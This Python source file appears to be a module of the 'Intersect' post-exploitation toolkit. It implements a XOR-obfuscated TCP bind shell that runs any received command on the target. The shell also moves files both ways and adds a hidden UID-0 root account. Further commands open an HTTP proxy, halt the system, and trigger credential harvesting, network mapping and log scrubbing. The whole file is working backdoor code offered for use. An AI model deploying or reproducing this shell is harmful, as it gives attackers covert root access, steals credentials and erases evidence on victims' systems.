
def xor(string, key):
    __description__ = "Starts a XOR ciphered TCP bindshell on the target. Interactive shell with download/upload and remote Intersect module execution."
    __author__ = "ohdae : bindshell[at]live[dot]com"
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


def xorshell():
    HOST = ''
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        print("[+] Shell bound on port %s" % PORT)
        conn, addr = server.accept()
        print "[+] New Connection: %s" % addr[0]
        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
    except:
        print "[!] Connection closed."
    	sys.exit(2)
    
    while True:
        cmd = conn.recv(socksize)
        cmd2 = xor(cmd, PKEY)
        proc = Popen(cmd2,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd2.startswith('cd'):
            destination = cmd2[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            elif os.path.isdir(os.getcwd()+destination):
                os.chdir(os.getcwd()+destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            else:
                conn.send(xor("[!] Directory does not exist", PKEY)) 
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))

        elif cmd2.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send(xor("[+] Root account " + acct + " has been created.\n", PKEY)) 

        elif cmd2 == ("httproxy"):
            httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
            conn.send(xor("[+] Serving HTTP proxy on port "+ PPORT +"", PKEY))
            httpd.serve_forever()  

        elif cmd2.startswith('upload'):
            getname = cmd2.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            data = conn.recv(socksize)
            filedata = xor(data, PKEY)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send(xor("[+] File upload complete!", PKEY))
            if not os.path.isfile(filename):
                conn.send(xor("[!] File upload failed! Please try again", PKEY))
        elif cmd2.startswith('download'):
            getname = cmd2.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, PKEY)
                conn.sendall(senddata)
            else:
                conn.send(xor("[+] File not found!", PKEY))
        elif cmd2.startswith("rebootsys"):
            conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
            os.system("shutdown -h now")
        elif cmd2 == ("extask osinfo"):
            Gather_OS()
            conn.send(xor("\n[+] OS Info Gathering complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask network"):
            NetworkInfo()
            conn.send(xor("\n[+] Network Gather complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask credentials"):
            GetCredentials()
            conn.send(xor("\n[+] Credentials Gather complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask livehosts"):
            NetworkMap()
            conn.send(xor("\n[+] Network Map complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask findextras"):
            FindExtras()
            conn.send(xor("\n[+] Extras Gather complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask scrub"):
            ScrubLog()
            conn.send(xor("\n[+] Scrubbing complete.", PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ('killme'):
            conn.send(xor("[!] Shutting down shell!\n", PKEY))
            conn.close()
            sys.exit(0)
        elif proc:
            conn.send(xor( stdout , PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))



